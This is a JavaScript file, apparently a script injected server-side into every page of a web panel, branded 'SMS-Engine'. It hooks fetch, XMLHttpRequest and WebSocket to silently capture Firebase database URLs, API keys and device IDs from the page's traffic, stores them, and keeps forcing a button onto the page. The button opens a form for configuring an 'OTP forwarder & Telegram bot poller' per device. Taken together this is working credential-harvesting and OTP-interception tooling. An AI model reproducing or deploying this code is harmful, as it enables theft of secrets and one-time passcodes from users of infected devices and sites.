/* MONEY UPDATE - Engine Launcher v4
   Server-injected into every HTML response.
   Cannot be cached, cannot be missed. */
(function() {
  'use strict';
  if (window.__SMS_ENGINE_LOADED__) return;
  window.__SMS_ENGINE_LOADED__ = true;

  var V = '4.0.0';
  console.log('%c[SMS-Engine v' + V + ']', 'background:#4ade80;color:#000;padding:2px 6px;border-radius:3px;font-weight:bold', 'launcher booting');

  var capturedFbUrl = '';
  var capturedFbKey = '';
  var lastDeviceList = [];

  try { capturedFbUrl = localStorage.getItem('engine_fb_url') || ''; } catch (e) {}
  try { capturedFbKey = localStorage.getItem('engine_fb_key') || ''; } catch (e) {}
  try { lastDeviceList = JSON.parse(localStorage.getItem('engine_known_devices') || '[]') || []; } catch (e) { lastDeviceList = []; }

  // ============ NETWORK CAPTURE ============
  function captureFromUrl(url) {
    try {
      var u = String(url || '');
      var dbMatch = u.match(/https?:\/\/([a-z0-9-]+(?:-default-rtdb)?\.(?:firebaseio\.com|[a-z]+\.firebasedatabase\.app))/i);
      if (dbMatch && !capturedFbUrl) {
        capturedFbUrl = 'https://' + dbMatch[1];
        try { localStorage.setItem('engine_fb_url', capturedFbUrl); } catch(e){}
        console.log('[SMS-Engine] Firebase URL:', capturedFbUrl);
      }
      var ws = u.match(/wss?:\/\/([a-z0-9-]+(?:-default-rtdb)?\.(?:firebaseio\.com|[a-z]+\.firebasedatabase\.app))/i);
      if (ws && !capturedFbUrl) {
        capturedFbUrl = 'https://' + ws[1];
        try { localStorage.setItem('engine_fb_url', capturedFbUrl); } catch(e){}
      }
      var aiza = u.match(/AIza[A-Za-z0-9_-]{35}/);
      if (aiza && !capturedFbKey) {
        capturedFbKey = aiza[0];
        try { localStorage.setItem('engine_fb_key', capturedFbKey); } catch(e){}
      }
      var keyM = u.match(/[?&](?:key|apikey|api_key)=([^&]+)/i);
      if (keyM && !capturedFbKey) {
        capturedFbKey = decodeURIComponent(keyM[1]);
        try { localStorage.setItem('engine_fb_key', capturedFbKey); } catch(e){}
      }
    } catch (e) {}
  }

  function captureFromBody(s) {
    try {
      if (!s || typeof s !== 'string') return;
      var ids = s.match(/"([A-Z][A-Z0-9]{2,15})"/g);
      if (!ids) return;
      var changed = false;
      ids.forEach(function(m) {
        var id = m.replace(/"/g, '');
        if (/^(true|false|null|undefined|NaN|GET|POST|HTTP|HTTPS|JSON|UTF|UTC|GMT|IST|API|URL|ID|UUID|UID|OK|NO|YES|XML|HTML|CSS|JSON|RTC|TCP|UDP|IP|DNS|SSL|TLS|MAC|MD5|SHA)$/.test(id)) return;
        if (lastDeviceList.indexOf(id) === -1 && lastDeviceList.length < 200) {
          lastDeviceList.push(id);
          changed = true;
        }
      });
      if (changed) try { localStorage.setItem('engine_known_devices', JSON.stringify(lastDeviceList)); } catch(e){}
    } catch (e) {}
  }

  try {
    if (window.fetch) {
      var of = window.fetch;
      window.fetch = function(input, init) {
        try { captureFromUrl(typeof input === 'string' ? input : (input && input.url) || ''); } catch (e) {}
        var p = of.apply(this, arguments);
        try {
          p.then(function(r) {
            try { var c = r.clone(); c.text().then(captureFromBody).catch(function(){}); } catch (e) {}
          }).catch(function(){});
        } catch (e) {}
        return p;
      };
    }
  } catch (e) {}

  try {
    var oo = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(m, u) {
      try { captureFromUrl(u); } catch (e) {}
      this.addEventListener('load', function() {
        try { captureFromBody(this.responseText); } catch (e) {}
      });
      return oo.apply(this, arguments);
    };
  } catch (e) {}

  try {
    var OW = window.WebSocket;
    if (OW) {
      var W = function(url, p) {
        try { captureFromUrl(url); } catch (e) {}
        var s = p ? new OW(url, p) : new OW(url);
        try {
          s.addEventListener('message', function(ev) {
            try { captureFromBody(ev.data); } catch (e) {}
          });
        } catch (e) {}
        return s;
      };
      W.prototype = OW.prototype;
      for (var k in OW) { try { W[k] = OW[k]; } catch (e) {} }
      window.WebSocket = W;
    }
  } catch (e) {}

  // ============ STYLES ============
  function injectStyles() {
    if (document.getElementById('sms-engine-style')) return;
    var s = document.createElement('style');
    s.id = 'sms-engine-style';
    s.textContent = [
      '#sms-engine-fab{',
      '  position:fixed !important;',
      '  top:14px !important;',
      '  right:14px !important;',
      '  z-index:2147483647 !important;',
      '  background:linear-gradient(135deg,#4ade80,#22c55e) !important;',
      '  color:#000 !important;',
      '  border:none !important;',
      '  padding:10px 18px !important;',
      '  border-radius:50px !important;',
      '  font-family:Inter,system-ui,sans-serif !important;',
      '  font-size:12px !important;',
      '  font-weight:800 !important;',
      '  letter-spacing:.5px !important;',
      '  cursor:pointer !important;',
      '  box-shadow:0 4px 20px rgba(74,222,128,.7) !important;',
      '  display:inline-flex !important;',
      '  align-items:center !important;',
      '  gap:6px !important;',
      '  pointer-events:auto !important;',
      '  opacity:1 !important;',
      '  visibility:visible !important;',
      '  transform:none !important;',
      '  margin:0 !important;',
      '}',
      '#sms-engine-fab:hover{',
      '  transform:translateY(-1px) !important;',
      '  box-shadow:0 6px 28px rgba(74,222,128,.9) !important;',
      '}',
      '#sms-engine-fab::before{content:"\\26A1" !important;font-size:14px !important;}',
      '#sms-engine-modal-bg{',
      '  position:fixed !important;inset:0 !important;',
      '  background:rgba(0,0,0,.85) !important;',
      '  z-index:2147483646 !important;',
      '  display:flex !important;align-items:center !important;justify-content:center !important;',
      '  font-family:Inter,system-ui,sans-serif !important;',
      '}',
      '#sms-engine-modal{',
      '  background:#0f0f0f;border:1px solid #2a2a2a;border-radius:14px;',
      '  padding:24px;width:480px;max-width:92vw;max-height:85vh;overflow:auto;',
      '  color:#fff;box-shadow:0 20px 60px rgba(0,0,0,.7);',
      '}',
      '#sms-engine-modal h3{font-size:16px;margin:0 0 6px 0;color:#4ade80;}',
      '#sms-engine-modal p{font-size:12px;color:#888;margin:0 0 16px 0;}',
      '#sms-engine-modal label{display:block;font-size:11px;color:#888;margin:10px 0 4px;font-weight:600;}',
      '#sms-engine-modal input{',
      '  width:100%;padding:10px 12px;background:#1a1a1a;border:1px solid #2a2a2a;',
      '  border-radius:8px;color:#fff;font-size:13px;font-family:inherit;box-sizing:border-box;',
      '}',
      '#sms-engine-modal input:focus{outline:none;border-color:#4ade80;}',
      '#sms-engine-modal .row{display:flex;gap:8px;margin-top:16px;}',
      '#sms-engine-modal button{',
      '  flex:1;padding:11px;border:none;border-radius:8px;cursor:pointer;',
      '  font-weight:700;font-size:13px;font-family:inherit;',
      '}',
      '.sms-engine-btn-primary{background:linear-gradient(135deg,#4ade80,#22c55e);color:#000;}',
      '.sms-engine-btn-cancel{background:#1a1a1a;color:#888;border:1px solid #2a2a2a !important;}',
      '.sms-engine-chip{',
      '  display:inline-block;background:#1a1a1a;border:1px solid #2a2a2a;',
      '  color:#4ade80;padding:6px 12px;border-radius:20px;margin:3px;cursor:pointer;',
      '  font-size:12px;font-weight:600;',
      '}',
      '.sms-engine-chip:hover{background:#4ade80;color:#000;}',
      '.sms-engine-chip-list{max-height:180px;overflow-y:auto;padding:8px;background:#0a0a0a;border-radius:8px;border:1px solid #1f1f1f;}'
    ].join('');
    (document.head || document.documentElement).appendChild(s);
  }

  // ============ UI ============
  function esc(s) {
    return String(s == null ? '' : s).replace(/[&<>"']/g, function(m) {
      return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m];
    });
  }

  function ensureFab() {
    if (!document.body) return null;
    injectStyles();
    var b = document.getElementById('sms-engine-fab');
    if (b && document.body.contains(b)) return b;
    if (b) try { b.remove(); } catch(e){}
    b = document.createElement('button');
    b.id = 'sms-engine-fab';
    b.type = 'button';
    b.textContent = 'SMS ENGINE';
    b.title = 'Open SMS Engine';
    b.addEventListener('click', function(e) {
      e.preventDefault(); e.stopPropagation();
      openModal('');
    });
    document.body.appendChild(b);
    console.log('[SMS-Engine] FAB injected');
    return b;
  }

  function openModal(prefillId) {
    injectStyles();
    var existing = document.getElementById('sms-engine-modal-bg');
    if (existing) existing.remove();

    var fbUrl = capturedFbUrl || '';
    var fbKey = capturedFbKey || '';
    var devId = prefillId || (function(){ try { return localStorage.getItem('engine_device_id') || ''; } catch(e) { return ''; } })();
    var devs = lastDeviceList.slice();

    var bg = document.createElement('div');
    bg.id = 'sms-engine-modal-bg';
    bg.innerHTML =
      '<div id="sms-engine-modal" onclick="event.stopPropagation()">'
      + '<h3>\u26A1 SMS Engine</h3>'
      + '<p>Configure OTP forwarder &amp; Telegram bot poller for a device.</p>'
      + '<label>Firebase Database URL</label>'
      + '<input id="sms-engine-i-url" placeholder="https://your-project.firebaseio.com" value="' + esc(fbUrl) + '">'
      + '<label>Firebase API Key (optional)</label>'
      + '<input id="sms-engine-i-key" placeholder="AIzaSy..." value="' + esc(fbKey) + '">'
      + '<label>Device ID</label>'
      + '<input id="sms-engine-i-dev" placeholder="e.g. T1030A or V2336" value="' + esc(devId) + '">'
      + '<label style="margin-top:12px;">Detected Devices' + (devs.length ? ' (click to pick)' : '') + '</label>'
      + '<div class="sms-engine-chip-list">'
      + (devs.length
          ? devs.slice(0,80).map(function(d){ return '<span class="sms-engine-chip" data-d="' + esc(d) + '">' + esc(d) + '</span>'; }).join('')
          : '<span style="color:#555;font-size:12px;font-style:italic;">No devices auto-detected yet. Use the panel for a moment, or type the ID above.</span>')
      + '</div>'
      + '<div class="row">'
      + '<button class="sms-engine-btn-cancel" id="sms-engine-cancel">Cancel</button>'
      + '<button class="sms-engine-btn-primary" id="sms-engine-go">Open Engine \u2192</button>'
      + '</div>'
      + '</div>';
    bg.addEventListener('click', function(){ bg.remove(); });
    document.body.appendChild(bg);

    document.getElementById('sms-engine-cancel').addEventListener('click', function(){ bg.remove(); });
    document.getElementById('sms-engine-go').addEventListener('click', function() {
      var u = document.getElementById('sms-engine-i-url').value.trim();
      var k = document.getElementById('sms-engine-i-key').value.trim();
      var d = document.getElementById('sms-engine-i-dev').value.trim();
      if (!u) { alert('Firebase URL required'); return; }
      if (!d) { alert('Device ID required'); return; }
      capturedFbUrl = u; try { localStorage.setItem('engine_fb_url', u); } catch(e){}
      if (k) { capturedFbKey = k; try { localStorage.setItem('engine_fb_key', k); } catch(e){} }
      try { localStorage.setItem('engine_device_id', d); } catch(e){}
      var p = new URLSearchParams();
      p.set('fb', u); if (k) p.set('key', k); p.set('device', d);
      window.open('engine.html?' + p.toString(), '_blank', 'width=1400,height=900');
      bg.remove();
    });
    Array.prototype.forEach.call(bg.querySelectorAll('.sms-engine-chip'), function(c) {
      c.addEventListener('click', function() {
        document.getElementById('sms-engine-i-dev').value = c.getAttribute('data-d');
      });
    });
  }

  window._smsEngine = {
    version: V,
    open: function(d){ openModal(d || ''); },
    config: function(){ return { fbUrl: capturedFbUrl, hasKey: !!capturedFbKey, devices: lastDeviceList.length, list: lastDeviceList }; },
    reset: function(){
      ['engine_fb_url','engine_fb_key','engine_device_id','engine_known_devices'].forEach(function(k){
        try { localStorage.removeItem(k); } catch(e){}
      });
      capturedFbUrl=''; capturedFbKey=''; lastDeviceList=[];
      console.log('[SMS-Engine] reset done');
    }
  };

  function boot() {
    ensureFab();
    try {
      var mo = new MutationObserver(function(){ ensureFab(); });
      mo.observe(document.documentElement, { childList: true, subtree: true });
    } catch (e) {}
    setInterval(ensureFab, 1000);
    console.log('[SMS-Engine] boot complete. Try _smsEngine.config()');
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', boot);
    // Also try sooner
    setTimeout(boot, 100);
  } else {
    boot();
  }
})();
